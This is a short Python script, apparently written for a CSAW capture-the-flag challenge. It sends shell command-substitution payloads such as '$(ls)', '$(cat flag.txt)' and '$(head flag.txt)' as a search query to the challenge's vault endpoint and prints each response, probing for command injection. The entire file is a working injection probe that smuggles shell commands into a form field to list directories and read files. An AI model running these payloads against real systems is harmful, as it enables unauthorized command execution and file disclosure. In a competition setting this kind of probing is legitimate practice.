import urllib.parse, urllib.request, json
def q(s):
    url = "http://web.chal.csaw.io:3700/vault/search?q=" + urllib.parse.quote(s, safe='')
    try:
        r = urllib.request.urlopen(url, timeout=20)
        return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

tests = [
    ('ls',            '$(ls)'),
    ('ls -a',         '$(ls -a)'),
    ('ls -la',        '$(ls -la)'),
    ('pwd',           '$(pwd)'),
    ('cat flag.txt',  '$(cat flag.txt)'),
    ('cat flag',      '$(cat flag)'),
    ('ls flag.txt',   '$(ls flag.txt)'),
    ('head flag.txt', '$(head flag.txt)'),
    ('echo hi',       '$(echo hi)'),
    ('echo a b',      '$(echo a b)'),
]
for name, t in tests:
    st, body = q(t)
    print(f"{name:16} {st} {body[:200]}")
    print('-'*70)
